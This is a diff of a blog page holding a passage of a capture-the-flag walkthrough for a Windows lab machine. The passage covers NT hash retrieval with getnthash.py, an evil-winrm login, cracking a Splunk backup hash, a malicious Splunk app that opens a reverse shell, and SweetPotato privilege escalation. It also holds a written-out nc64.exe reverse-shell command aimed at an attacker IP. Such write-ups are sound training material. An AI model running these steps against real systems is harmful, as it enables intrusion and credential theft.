-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_29.png" alt="image.png" /></p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a NT hash using that tgt
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_28.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_29.png" alt="image.png" />
+<br /><br /></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a NT hash using that tgt
 </span><span class="n">python</span> <span class="n">getnthash</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="o">-</span><span class="n">key</span> <span class="n">key</span> <span class="n">domain</span><span class="o">/</span><span class="n">target</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_30.png" alt="image.png" /></p>
-
-<p>We can spawn a <code class="language-plaintext highlighter-rouge">edward.martin</code> shell using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to obtain the user flag</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_31.png" alt="image.png" /></p>
-
-<h1 id="3priv-esc">3.Priv esc</h1>
-
-<p>Check the splunk directories until you locate a backup</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_32.png" alt="image.png" /></p>
-
-<p>Another version of the files we have abused early was in there with different hash and different secret</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_33.png" alt="image.png" /></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_34.png" alt="image.png" /></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_35.png" alt="image.png" /></p>
-
-<p>Crack the hash we found</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_36.png" alt="image.png" /></p>
-
-<p>It is supposed <code class="language-plaintext highlighter-rouge">alexander.green</code> credentials</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_37.png" alt="image.png" /></p>
-
-<p>Log in with that password in the main web application service as the admin user</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_38.png" alt="image.png" /></p>
-
-<p>From here, it is straightforward, find how to exploit a reverse shell in splunk</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_39.png" alt="image.png" /></p>
-
-<p>Set ip and port in <code class="language-plaintext highlighter-rouge">run.ps1</code> as we are dealing with a Windows machine</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_40.png" alt="image.png" /></p>
-
-<p>Follow the instructions in the repository. Compress those files</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_41.png" alt="image.png" /></p>
-
-<p>Then, upload them as an app installation in splunk</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_42.png" alt="image.png" /></p>
-
-<p>It is successfully installed, we only need to enable it to trigger the reverse shell</p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_43.png" alt="image.png" /></p>
-
-<p>After obtaining a shell, enumerating Alexander’s privileges we discovered <code class="language-plaintext highlighter-rouge">SeImpersonatePriviele</code></p>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_44.png" alt="image.png" /></p>
-
-<p>This privilege allow us to use a process to impersonate another user, <code class="language-plaintext highlighter-rouge">SweetPotato</code> pr <code class="language-plaintext highlighter-rouge">godpotato</code> are recommended tools for this task</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">'type c:\users</span><span class="se">\a</span><span class="s">dministrator\desktop</span><span class="se">\r</span><span class="s">oot.txt'</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_30.png" alt="image.png" />
+<br /><br />
+We can spawn a <code class="language-plaintext highlighter-rouge">edward.martin</code> shell using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to obtain the user flag
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_31.png" alt="image.png" />
+<br /><br /></p>
+    <h1 id="3priv-esc">3.Priv esc</h1>
+    <p><br /><br />
+Check the splunk directories until you locate a backup
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_32.png" alt="image.png" />
+<br /><br />
+Another version of the files we have abused early was in there with different hash and different secret
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_33.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_34.png" alt="image.png" />
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_35.png" alt="image.png" />
+<br /><br />
+Crack the hash we found
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_36.png" alt="image.png" />
+<br /><br />
+It is supposed <code class="language-plaintext highlighter-rouge">alexander.green</code> credentials
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_37.png" alt="image.png" />
+<br /><br />
+Log in with that password in the main web application service as the admin user 
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_38.png" alt="image.png" />
+<br /><br />
+From here, it is straightforward, find how to exploit a reverse shell in splunk 
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_39.png" alt="image.png" />
+<br /><br />
+Set ip and port in <code class="language-plaintext highlighter-rouge">run.ps1</code> as we are dealing with a Windows machine 
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_40.png" alt="image.png" />
+<br /><br />
+Follow the instructions in the repository. Compress those files
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_41.png" alt="image.png" />
+<br /><br />
+Then, upload them as an app installation in splunk
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_42.png" alt="image.png" />
+<br /><br />
+It is successfully installed, we only need to enable it to trigger the reverse shell
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_43.png" alt="image.png" />
+<br /><br />
+After obtaining a shell, enumerating Alexander’s privileges we discovered <code class="language-plaintext highlighter-rouge">SeImpersonatePriviele</code> 
+<br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_44.png" alt="image.png" />
+<br /><br />
+This privilege allow us to use a process to impersonate another user, <code class="language-plaintext highlighter-rouge">SweetPotato</code> pr <code class="language-plaintext highlighter-rouge">godpotato</code> are recommended tools for this task
+<br /><br /></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">'type c:\users</span><span class="se">\a</span><span class="s">dministrator\desktop</span><span class="se">\r</span><span class="s">oot.txt'</span>
 <span class="c1">#Or upload a nc.exe file and execute
 </span><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">"C:\programdata</span><span class="se">\n</span><span class="s">c64.exe 10.10.14.6 444 -e cmd.exe"</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_45.png" alt="image.png" /></p>
-
-<p>Machine pwned@!@@!@
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_45.png" alt="image.png" />
+<br /><br />
+Machine pwned@!@@!@
 <script src="/assets/js/matrix-overlay.js"></script></p>
+  </li>
+</ul>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
